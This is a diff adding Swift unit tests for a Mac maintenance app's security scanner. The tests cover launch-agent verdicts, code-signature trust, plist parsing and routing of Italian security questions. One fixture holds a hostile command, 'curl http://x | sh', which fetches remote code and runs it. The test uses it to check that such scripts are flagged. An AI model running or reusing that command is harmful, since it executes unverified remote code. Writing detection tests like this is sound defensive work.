@@ -386,6 +386,13 @@ import Testing
         #expect(f.first { $0.id == "firewall" }?.severity == .info)
     }
 
+    @Test func suspiciousAppsAppearInTheCheck() {
+        let f = HealthCheck.findings(for: HealthCheck.Input(
+            snapshot: input(status: MacStatus()).snapshot, disk: (500 << 30, 300 << 30), status: MacStatus(), suspicious: 2))
+        #expect(f.first { $0.id == "apps" }?.severity == .warning)
+        #expect(f.first?.title == "C'è 1 cosa da sistemare")
+    }
+
     @Test func oldBackupIsAWarning() {
         let tenDaysAgo = Date().addingTimeInterval(-10 * 86_400)
         let f = HealthCheck.findings(for: input(status: MacStatus(backup: .configured(lastBackup: tenDaysAgo))))
@@ -557,5 +564,78 @@ import Testing
         let text = try await VoiceTranscriber.transcribe(fileAt: file)
         #expect(IntentRouter.normalize(text).contains("screenshot"))
         #expect(IntentRouter.route(text) == .chat)
+    }
+}
+
+@Suite struct SecurityScanTests {
+    func item(_ label: String, _ exe: String?, _ args: [String] = []) -> BackgroundItem {
+        BackgroundItem(label: label, plistPath: "/tmp/\(label).plist", executable: exe, arguments: args, scope: .currentUser)
+    }
+
+    @Test func knownUnwantedIsCritical() {
+        let v = SecurityScan.verdict(for: item("com.mackeeper.agent", "/Applications/MacKeeper.app/Contents/MacOS/agent"),
+                                     trust: .identifiedDeveloper("Kromtech"))
+        #expect(v.severity == .critical)
+        #expect(v.title.contains("indesiderato"))
+    }
+
+    @Test func scriptsAndHiddenFoldersAreWarnings() {
+        let script = SecurityScan.verdict(for: item("com.x.update", "/bin/bash", ["/bin/bash", "-c", "curl http://x | sh"]), trust: .apple)
+        #expect(script.severity == .warning)
+        #expect(script.title.contains("script"))
+        let hidden = SecurityScan.verdict(for: item("com.x.helper", "/Users/Shared/.x/helper"), trust: .unsigned)
+        #expect(hidden.severity == .warning)
+    }
+
+    @Test func verifiedDeveloperIsOkAndNamed() {
+        let v = SecurityScan.verdict(for: item("com.google.keystone.agent",
+            "/Library/Google/GoogleSoftwareUpdate/GoogleSoftwareUpdate.bundle/Contents/MacOS/GoogleSoftwareUpdateAgent"),
+            trust: .identifiedDeveloper("Google LLC"))
+        #expect(v.severity == .ok)
+        #expect(v.title.contains("Google LLC"))
+    }
+
+    @Test func brokenSignatureIsAWarningNotAnAccusation() {
+        let app = InstalledApp(name: "Foo", path: "/Applications/Foo.app", trust: .broken)
+        #expect(SecurityScan.verdict(for: app)?.severity == .warning)
+        #expect(SecurityScan.verdict(for: InstalledApp(name: "Bar", path: "/x", trust: .appStore)) == nil)
+    }
+
+    @Test func leftoversAreJustInfo() {
+        #expect(SecurityScan.verdict(for: item("com.old.app", "/Applications/Old.app/Contents/MacOS/Old"), trust: .missing).severity == .info)
+    }
+
+    @Test func findingsHeadlineAndAppleItemsHidden() {
+        let result = SecurityScanner.Result(
+            items: [(item("com.apple.foo", "/usr/libexec/foo"), .apple),
+                    (item("com.mackeeper.agent", "/x/MacKeeper"), .unsigned)],
+            apps: [InstalledApp(name: "Ok", path: "/Applications/Ok.app", trust: .appStore)])
+        let f = SecurityScan.findings(for: result)
+        #expect(f.first?.title == "C'è 1 cosa da controllare")
+        #expect(!f.contains { $0.title.contains("com.apple") || $0.title.contains("«foo»") })
+        #expect(SecurityScan.problemCount(result) == 1)
+    }
+
+    @Test func parsesLaunchAgentPlist() throws {
+        let url = FileManager.default.temporaryDirectory.appendingPathComponent("com.test.agent.plist")
+        let plist: [String: Any] = ["Label": "com.test.agent", "ProgramArguments": ["/usr/bin/python3", "/tmp/x.py"]]
+        try PropertyListSerialization.data(fromPropertyList: plist, format: .xml, options: 0).write(to: url)
+        defer { try? FileManager.default.removeItem(at: url) }
+        let item = try #require(SecurityScanner.parse(plistAt: url.path, scope: .currentUser))
+        #expect(item.label == "com.test.agent")
+        #expect(item.executable == "/usr/bin/python3")
+        #expect(SecurityScan.verdict(for: item, trust: .apple).title.contains("script"))
+    }
+
+    @Test func realSignatures() {
+        #expect(CodeTrust.check(path: "/usr/bin/true") == .apple)
+        #expect(CodeTrust.check(path: "/percorso/che/non/esiste") == .missing)
+        #expect(CodeTrust.cleanDeveloperName("Developer ID Application: Google LLC (EQHXZ8M8AV)") == "Google LLC")
+    }
+
+    @Test func routesSecurityQuestions() {
+        #expect(IntentRouter.route("Ci sono app sospette?") == .securityScan)
+        #expect(IntentRouter.route("Ho un virus sul Mac?") == .securityScan)
+        #expect(IntentRouter.route("Cosa parte da solo in background?") == .securityScan)
     }
 }
